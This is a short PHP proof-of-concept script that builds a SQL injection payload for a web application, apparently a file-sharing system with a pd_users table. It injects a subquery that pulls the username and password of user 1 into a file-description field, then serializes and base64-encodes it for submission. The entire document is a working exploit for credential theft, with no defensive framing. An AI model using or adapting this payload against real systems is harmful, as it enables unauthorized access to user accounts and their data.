<?php
$sql = "','131','1401643183','1','0','0','2','1','192.168.1.104'),(1,(select concat(username,':',password) from pd_users where userid=1), 'h9VI0SKm', 'php','application/octet-stream','',20,1532351266,1,0,2,2,1,'172.18.1.1')#";
//2,1,'172.18.1.1')#";  这里1为folderid
$file = array();
$file['file_id'] = 1;
$file['file_size'] = 1;
$file['file_extension'] = 'jpg';
$file['file_name'] = 'a';
$file['file_description'] = $sql;
echo "\n";
echo base64_encode(serialize($file));
echo "\n";

